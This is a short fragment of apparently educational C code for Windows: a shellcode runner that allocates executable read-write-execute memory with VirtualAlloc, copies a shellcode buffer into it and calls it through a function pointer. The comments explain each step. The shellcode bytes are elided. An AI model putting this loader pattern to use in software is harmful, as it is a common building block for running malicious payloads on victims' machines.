...
int main() {
    ...
    // Allocate (a) new page(s) with enough space for our shellcode at a system defined address (0) to a committed memory location with full RWX permissions
    // TODO: Change "MEM_COMMIT" to "MEM_COMMIT | MEM_RESERVE"? "To reserve and commit pages in one step, call VirtualAlloc with MEM_COMMIT | MEM_RESERVE" and "Attempting to commit a specific address range by specifying MEM_COMMIT without MEM_RESERVE and a non-NULL lpAddress fails unless the entire range has already been reserved."
    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019
    // Copy the shellcode into the page(s) we allocated above
    memcpy(exec, shellcode, sizeof shellcode);

    // https://stackoverflow.com/questions/1952175/how-to-call-the-function-using-function-pointer
    // Directly invoke the shellcode by executing it from the first byte as a function
    ((void(*)())exec)();
